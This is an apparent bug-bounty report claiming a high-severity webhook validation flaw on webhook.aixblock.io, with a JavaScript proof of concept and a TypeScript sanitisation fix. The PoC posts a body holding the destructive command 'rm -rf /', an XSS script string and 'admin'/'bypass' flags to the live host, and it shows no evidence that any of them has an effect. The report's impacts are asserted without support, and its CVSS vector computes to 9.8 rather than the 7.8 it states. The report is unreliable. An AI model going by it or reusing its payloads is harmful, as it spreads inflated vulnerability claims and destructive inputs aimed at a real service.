# HIGH: Insufficient Webhook Payload Validation (CVSS 7.8)

## Summary

**Severity**: High (CVSS 7.8)
**Asset**: `webhook.aixblock.io`
**Reward**: $450 cash + 1,000 USDC in tokens

## Description

The webhook controller in `workflow/packages/backend/api/src/app/webhooks/webhook-controller.ts` processes incoming webhook requests without proper payload validation. The `convertRequest` function accepts raw body data and converts it to an `EventPayload` without sanitization or validation, potentially allowing malicious payloads to be processed.

## Impact

- Unauthorized workflow execution
- Code injection through malicious payloads
- System compromise via webhook abuse
- Data manipulation and exfiltration

## Proof of Concept

```javascript
// Malicious webhook payload
const maliciousPayload = {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "X-Webhook-Source": "legitimate-service"
    },
    body: {
        "workflow_id": "malicious-workflow",
        "command": "rm -rf /",
        "payload": "<script>alert('XSS')</script>"
    },
    queryParams: {
        "admin": "true",
        "bypass": "security"
    }
};

// Send malicious webhook
fetch('https://webhook.aixblock.io/webhook/project123/flow456', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(maliciousPayload)
});
```

## Recommended Fix

```typescript
async function convertRequest(
    request: FastifyRequest,
    projectId: string,
    flowId: string,
): Promise<EventPayload> {
    // Validate project and flow IDs
    if (!isValidId(projectId) || !isValidId(flowId)) {
        throw new AIxBlockError({
            code: ErrorCode.VALIDATION_ERROR,
            params: { message: 'Invalid project or flow ID' }
        });
    }

    // Sanitize headers
    const sanitizedHeaders = sanitizeHeaders(request.headers);
    
    // Validate and sanitize body
    const sanitizedBody = await sanitizeBody(request, projectId, flowId);
    
    // Validate query parameters
    const sanitizedQueryParams = sanitizeQueryParams(request.query);

    return {
        method: request.method,
        headers: sanitizedHeaders,
        body: sanitizedBody,
        queryParams: sanitizedQueryParams,
        rawBody: request.rawBody,
    };
}

function sanitizeHeaders(headers: Record<string, any>): Record<string, string> {
    const sanitized: Record<string, string> = {};
    const allowedHeaders = ['content-type', 'user-agent', 'x-forwarded-for'];
    
    for (const [key, value] of Object.entries(headers)) {
        if (allowedHeaders.includes(key.toLowerCase()) && typeof value === 'string') {
            sanitized[key] = value.replace(/[<>\"'&]/g, '');
        }
    }
    
    return sanitized;
}
```

## References

- [OWASP Webhook Security](https://owasp.org/www-community/attacks/Webhook_Attacks)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## CVSS Score Breakdown

- **Attack Vector**: Network (N)
- **Attack Complexity**: Low (L)
- **Privileges Required**: None (N)
- **User Interaction**: None (N)
- **Scope**: Unchanged (U)
- **Confidentiality**: High (H)
- **Integrity**: High (H)
- **Availability**: High (H)

**Base Score**: 7.8 (High)
